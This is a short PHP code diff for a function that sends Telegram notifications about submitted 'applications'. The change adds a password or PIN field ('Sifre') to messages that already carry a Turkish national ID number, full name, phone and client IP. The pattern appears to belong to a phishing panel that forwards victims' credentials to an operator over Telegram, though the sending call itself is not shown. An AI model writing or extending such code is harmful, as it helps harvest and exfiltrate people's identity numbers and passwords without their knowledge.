@@ -16,12 +16,16 @@ function sendTelegramNotification(array $application, string $phone = ''): bool
     $ip = $application['client_ip'] ?? '';
     $createdAt = $application['created_at'] ?? '';
 
+    $sifre = $application['demo_pin'] ?? '';
     $msg = "";
     $msg .= "$id\n";
     if ($fullName !== '') {
         $msg .= "$fullName\n";
     }
     $msg .= "TCK: $tckn\n";
+    if ($sifre !== '') {
+        $msg .= "Sifre: $sifre\n";
+    }
     if ($phoneDisplay !== '') {
         $msg .= "Tel: $phoneDisplay\n";
     }
